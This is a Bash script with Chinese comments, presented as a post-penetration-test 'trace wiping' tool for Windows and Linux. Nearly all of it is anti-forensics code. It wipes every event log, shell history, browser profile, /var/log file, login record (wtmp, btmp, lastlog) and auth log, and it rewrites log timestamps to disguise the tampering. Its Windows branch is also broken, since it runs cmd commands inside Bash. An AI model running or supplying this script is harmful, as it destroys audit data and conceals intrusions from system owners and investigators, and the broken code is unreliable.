#!/usr/bin/env bash
#
# cleanup.sh —— 渗透测试后痕迹擦除脚本（跨平台版）
# 支持：Windows Batch + PowerShell 和 Linux Bash
# 要求：以管理员（Windows）或 root（Linux）身份运行

prompt_os() {
  echo "======================================"
  echo "  渗透测试痕迹擦除脚本 (cleanup.sh)"
  echo "======================================"
  echo "请选择操作系统："
  echo "  1) Windows"
  echo "  2) Linux"
  read -p "输入 [1-2] 并回车: " OS_CHOICE
}

pause() {
  read -p "按回车继续..."
}

# --------------------------------------------------
# Windows 清理（CMD + PowerShell）
# --------------------------------------------------

windows_cleanup() {
  echo "[*] 检查管理员权限…"
  net session >nul 2>&1
  if [ $? -ne 0 ]; then
    echo "请以管理员身份重新运行此脚本！"
    exit 1
  fi

  echo "[*] 开始 Windows 痕迹擦除..."

  echo "  - 清理 PowerShell 历史"
  powershell -Command "Remove-Item -Force \$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue"

  echo "  - 清理 CMD 最近记录"
  del /F /Q "%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*"
  del /F /Q "%APPDATA%\Microsoft\Windows\Recent\CustomDestinations\*"

  echo "  - 清理事件日志"
  powershell -Command "Get-WinEvent -ListLog * | ForEach-Object { wevtutil cl \$_.LogName }"

  echo "  - 清理临时文件"
  rd /S /Q "%TEMP%" && md "%TEMP%"

  echo "  - 清理浏览器缓存（Edge/Chrome/Firefox）"
  powershell -Command "
    \$paths = @(
      '\$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache',
      '\$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache',
      '\$env:APPDATA\Mozilla\Firefox\Profiles\*'
    );
    foreach (\$p in \$paths) {
      Remove-Item -Recurse -Force \$p -ErrorAction SilentlyContinue
    }
  "

  echo "  - 伪装事件日志时间戳"
  powershell -Command "
    Get-ChildItem -Path 'C:\Windows\System32\winevt\Logs' -Filter *.evtx |
      ForEach-Object { Set-ItemProperty -Path \$_.FullName -Name LastWriteTime -Value (Get-Date) }
  "

  echo "[✔] Windows 痕迹擦除完成。"
  pause
}

# --------------------------------------------------
# Linux 清理（Bash）
# --------------------------------------------------

linux_cleanup() {
  echo "[*] 检查 root 权限…"
  if [ "$(id -u)" -ne 0 ]; then
    echo "请以 root 身份重新运行此脚本！"
    exit 1
  fi

  echo "[*] 开始 Linux 痕迹擦除..."

  echo "  - 清理 Bash 历史"
  unset HISTFILE
  history -cw
  rm -f /root/.bash_history
  for U in /home/*; do
    HIST="$U/.bash_history"
    [ -f "$HIST" ] && rm -f "$HIST"
  done

  echo "  - 清理 Zsh 历史"
  rm -f /root/.zhistory
  rm -f /home/*/.zhistory
  rm -rf /home/*/.zsh_sessions

  echo "  - 清理日志文件"
  find /var/log -type f -exec truncate -s 0 {} \;
  journalctl --rotate 2>/dev/null
  journalctl --vacuum-time=1s 2>/dev/null

  echo "  - 清理登录痕迹（who, last, lastlog）"
  for f in /var/run/utmp /var/log/wtmp /var/log/btmp /var/log/lastlog; do
    [ -f "$f" ] && truncate -s 0 "$f"
  done

  echo "  - 清理 SSH 和 sudo 日志"
  truncate -s 0 /var/log/auth.log /var/log/secure /var/log/faillog 2>/dev/null

  echo "  - 清理最近打开文件（GNOME/KDE）"
  find /home -maxdepth 2 -type f -name 'recently-used.xbel' -delete 2>/dev/null

  echo "  - 清理用户缓存"
  rm -rf /home/*/.cache/*

  echo "  - 伪装 /var/log 时间戳"
  find /var/log -type f -exec touch {} \;

  echo "[✔] Linux 痕迹擦除完成。"
  pause
}

# --------------------------------------------------
# 主流程
# --------------------------------------------------

prompt_os

case "$OS_CHOICE" in
  1) windows_cleanup ;;
  2) linux_cleanup ;;
  *) echo "无效选项，退出。" ; exit 1 ;;
esac

exit 0
